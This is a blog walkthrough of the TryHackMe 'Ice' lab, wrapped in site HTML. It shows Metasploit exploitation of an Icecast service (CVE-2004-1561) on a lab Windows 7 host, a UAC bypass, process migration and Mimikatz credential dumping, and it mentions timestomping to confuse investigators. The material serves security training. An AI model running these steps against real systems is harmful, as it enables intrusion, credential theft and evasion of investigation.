@@ -1,0 +1,590 @@
+<!DOCTYPE html>
+<html lang="en" dir=>
+
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Ice is the extension to the Blue room. In this room we learn more about windows recon, exploitation and escalation. This box uses a vulnerable service called Icecast which allows us to access the machine using metasploit, then elevate those privileges by abusing a spool process.">
+<meta name="theme-color" content="#FFFFFF"><meta property="og:title" content="Ice" />
+<meta property="og:description" content="Ice is the extension to the Blue room. In this room we learn more about windows recon, exploitation and escalation. This box uses a vulnerable service called Icecast which allows us to access the machine using metasploit, then elevate those privileges by abusing a spool process." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://stefantobler.com/posts/try-hack-me/ice/" />
+<meta property="article:published_time" content="2020-05-26T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-05-26T00:00:00+00:00" />
+<title>Ice | Stefan Tobler</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/favicon.png" type="image/x-icon">
+<link rel="stylesheet" href="/book.min.6cd8553a6854f4812343f0f0c8baca31271e686434f381fbe3c7226f66639176.css" integrity="sha256-bNhVOmhU9IEjQ/DwyLrKMSceaGQ084H748cib2ZjkXY=">
+<script defer src="/en.search.min.24f8f40c2756168e54d3c52c27896d20a0bdf40f75067c6dc1577730a766787f.js" integrity="sha256-JPj0DCdWFo5U08UsJ4ltIKC99A91BnxtwVd3MKdmeH8="></script>
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-158607018-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+<!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+
+  
+<link rel="stylesheet" href="/assets/css/posts.css" />
+
+</head>
+
+<body dir=>
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      
+  <nav>
+<h2 class="book-brand">
+  <a href="/"><img src="/images/logo.png" alt="Logo" /><span>Stefan Tobler</span>
+  </a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+<span><a href='https://stefantobler.com/posts/'>Recent Posts</a></span>
+
+
+
+
+
+
+
+  
+
+
+
+  
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="https://stefantobler.com/categories/hack-the-box">Hack the Box</a>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="https://stefantobler.com/categories/challenges">Challenges</a>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="/posts/hack-the-box/challenges/fuzzy/" class="">Fuzzy</a>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/posts/hack-the-box/archetype/" class="">Archetype</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/posts/hack-the-box/magic/" class="">Magic</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/posts/hack-the-box/remote/" class="">Remote</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/posts/hack-the-box/traceback/" class="">Traceback</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/posts/hack-the-box/admirer/" class="">Admirer</a>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="https://stefantobler.com/categories/try-hack-me">Try Hack Me</a>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="/posts/try-hack-me/basic-pentesting/" class="">Basic Pentesting</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/posts/try-hack-me/blue/" class="">Blue</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/posts/try-hack-me/ice/" class="active">Ice</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/posts/try-hack-me/vulnversity/" class="">Vulnversity</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/posts/try-hack-me/shodan.io/" class="">Shodan.io</a>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="https://stefantobler.com/categories/capture-the-flag">Capture the Flag</a>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="/posts/ctf/nahamcon_2021/" class="">Nahamcon 2021 CTF</a>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="https://stefantobler.com/categories/misc">Misc</a>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="/posts/misc/docker-containerization-vs-virtualization/" class="">Docker - Containerization vs. Virtualization</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/posts/misc/virtualbox-tutorial/" class="">How to Install Kali Linux on VirtualBox</a>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var menu=document.querySelector("aside.book-menu nav");addEventListener("beforeunload",function(event){localStorage.setItem("menu.scrollTop",menu.scrollTop);});menu.scrollTop=localStorage.getItem("menu.scrollTop");})();</script>
+
+
+ 
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>Ice</strong>
+
+  <label for="toc-control">
+    
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#tools">Tools</a></li>
+    <li><a href="#walkthrough">Walkthrough</a></li>
+  </ul>
+</nav>
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+
+<div class="post-hero-container">
+  <img class="card-img-top" src='/images/content/posts/try-hack-me/ice.png'/>
+</div>
+
+<article class="markdown">
+  <h1>
+    <a href="/posts/try-hack-me/ice/">Ice</a>
+  </h1>
+  
+  
+  <div>
+    
+      <a href="/categories/try-hack-me/">try-hack-me</a>
+  </div>
+  
+
+  
+  <div>
+    
+      <a href="/tags/windows/">windows</a>, 
+      <a href="/tags/nmap/">nmap</a>, 
+      <a href="/tags/mimikatz/">mimikatz</a>, 
+      <a href="/tags/cve-2004-1561/">CVE-2004-1561</a>, 
+      <a href="/tags/metasploit/">metasploit</a>
+  </div>
+  
+
+
+  <p><p>Ice is the extension to the <a href="https://stefantobler.com/posts/try-hack-me/blue">Blue</a> room. In this room we learn more about windows recon, exploitation and escalation. This box uses a vulnerable service called Icecast which allows us to access the machine using metasploit, then elevate those privileges by abusing a spool process.</p>
+<h2 id="tools">
+  Tools
+  <a class="anchor" href="#tools">#</a>
+</h2>
+<ul>
+<li>nmap</li>
+<li>metasploit</li>
+</ul>
+<h2 id="walkthrough">
+  Walkthrough
+  <a class="anchor" href="#walkthrough">#</a>
+</h2>
+<p>First things first. Nmap scan. I used the command <code>sudo nmap -sV -A -sS $IP</code> then piped the output to <code>nmap/nmap.txt</code>.</p>
+<pre><code>Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-26 18:31 EDT
+Nmap scan report for 10.10.220.176
+Host is up (0.13s latency).
+Not shown: 989 closed ports
+PORT      STATE SERVICE      VERSION
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Service Unavailable
+8000/tcp  open  http         Icecast streaming media server
+|_http-title: Site doesn't have a title (text/html).
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49158/tcp open  msrpc        Microsoft Windows RPC
+49159/tcp open  msrpc        Microsoft Windows RPC
+49161/tcp open  msrpc        Microsoft Windows RPC
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=5/26%OT=135%CT=1%CU=40177%PV=Y%DS=2%DC=T%G=Y%TM=5ECD99
+OS:36%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10D%TI=I%CI=I%II=I%SS=S%TS
+OS:=7)SEQ(SP=107%GCD=1%ISR=10D%TI=I%CI=I%TS=7)OPS(O1=M508NW8ST11%O2=M508NW8
+OS:ST11%O3=M508NW8NNT11%O4=M508NW8ST11%O5=M508NW8ST11%O6=M508ST11)WIN(W1=20
+OS:00%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M5
+OS:08NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80
+OS:%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q
+OS:=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A
+OS:=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%D
+OS:F=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL
+OS:=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)
+
+Network Distance: 2 hops
+Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
+|_nbstat: NetBIOS name: DARK-PC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02:00:58:2b:54:ae (unknown)
+| smb-os-discovery: 
+|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+|   Computer name: Dark-PC
+|   NetBIOS computer name: DARK-PC\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2020-05-26T17:33:15-05:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-05-26T22:33:15
+|_  start_date: 2020-05-26T22:29:10
+
+TRACEROUTE (using port 143/tcp)
+HOP RTT       ADDRESS
+1   232.30 ms 10.9.0.1
+2   232.43 ms 10.10.220.176
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 107.56 seconds
+</code></pre><p>From the results it looks like there is a webserver open on port 8000 and port 5357. On port 800 there is an interesting software called Icecast running. Let&rsquo;s do some research about this. It looks like Icecast is a software that allows a computer to be a media server.</p>
+<p>To learn about the vulnerability this machine has TryHackMe gave us a big hint. It told us that there is a vulnerability with the level 7.5 on cvedetails.com. There are two exploits with this level on cvedetails that deal with Icecast. The one we are looking for is CVE-2004-1561. Its type is execute code overflow. Now that we know what exploit this machine might fall victim too let&rsquo;s fire up metasploit and load out module in. To do this type <code>msfconsole</code> then <code>search icecast</code> and finally <code>use 0</code> because this exploit is the only on in metasploit for Icecast. Next we will use <code>show options</code> to see what we need in order to execute the exploit. Turns out the required option is RHOSTS. Now let&rsquo;s set the RHOSTS to our target IP. Use the command <code>set RHOSTS 10.10.220.176</code>. Finally lets run the exploit! Use the <code>exploit</code> command.</p>
+<p>Now that we have a foothold we can being escalating our privileges. First TryHackMe asks what shell we are using. And for this exploit metasploit is nice enough to throw us into the <code>meterpreter</code> shell. Now we can take a look at the processes running on the machine. To do this we can run the command <code>ps</code> to see the current processes. Turns out that a user named &lsquo;Dark&rsquo; is running Icecast. Now the build of Windows that this machine is running is 7601. I just took a look at my nmap scan to figure this out. We can also use the command <code>sysinfo</code>. This also tells us that the machine is on an &lsquo;x64&rsquo; architecture. Now let&rsquo;s run <code>run post/multi/recon/local_exploit_suggester</code> which will suggest us some exploits to run against this machine. After running these are our results:</p>
+<pre><code>[+] 10.10.220.176 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+[+] 10.10.220.176 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
+[+] 10.10.220.176 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
+[+] 10.10.220.176 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
+[+] 10.10.220.176 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.220.176 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.220.176 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[+] 10.10.220.176 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+</code></pre><p>TryHackMe wants us to use the first one. Suspend the current session using CTRL-Z then use the command <code>use exploit/windows/local/bypassuac_eventvwr</code> to load the exploit. Then set the session to 1 using <code>set SESSION 1</code> (This might be different depending on how you used metasploit. If you need to check use the command <code>sessions</code>). Now that we have set the session we need to set the listener ip. We can type <code>ip addr</code> in the command line to get out TryHackMe address. Your TryHackMe IP should be the one under the <code>tun0</code> section. You can also check this in the access tab on the website. In my case my internal IP is <code>10.9.12.124</code>. Now run the exploit and connect to the newly created session using the command <code>sessions #</code>. Now that we have connected we can use the command <code>getprivs</code> to see what processes we have access to. One of these process should allow us to take ownership of files. Based on the list output from <code>getprivs</code> it looks like &lsquo;SeTakeOwnershipPrivilege&rsquo; is what we are looking for. Now that we know how to gain access to what we want we need to do it.</p>
+<p>Now that we are on the machine we are running on a process that is being run under the &lsquo;Dark&rsquo; user. However even though we have escalated privileges as &lsquo;NT AUTHORITY\SYSTEM&rsquo; we are not in an escalated process. To get to an escalated process we can use the <code>ps</code> command to see the processes running. Then we can migrate to a process that is running as NT AUTHORITY\SYSTEM. For this box we are going to pick the <code>spoolsv.exe</code> process because is it running on the same architecture that the lsass service is running. lsass is our target. Now let&rsquo;s migrate. On my box the <code>spoolsv.exe</code> process id is 1400 so I will use the command <code>migrate 1400</code> to move to that process. Next I am going to load in the meterpreter extension Mimikatz using the command <code>load kiwi</code>, kiwi being the Minikatz version. Minikatz will allow us to dump the passwords. To get the credentials use the command <code>creds_all</code>. We can get all the hashes using the command <code>hashdump</code>. We can also watch the user&rsquo;s screen using <code>screenshare</code> or listen to their microphone using the command <code>record_mic</code>. We can also change time stamps using the command <code>timestomp</code>. This could be used to confuse investigators after an attack. If we wanted to we could also create a &lsquo;golden ticket&rsquo; with Minikatz that allows us to easily authenticate other users on the system.</p>
+</p>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+
+
+
+</div>
+
+ 
+        
+      </footer>
+
+      
+  
+  <div class="book-comments">
+<div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "stefantobler" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+    <aside class="book-toc">
+      
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#tools">Tools</a></li>
+    <li><a href="#walkthrough">Walkthrough</a></li>
+  </ul>
+</nav>
+
+ 
+    </aside>
+    
+  </main>
+
+  
+</body>
+
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
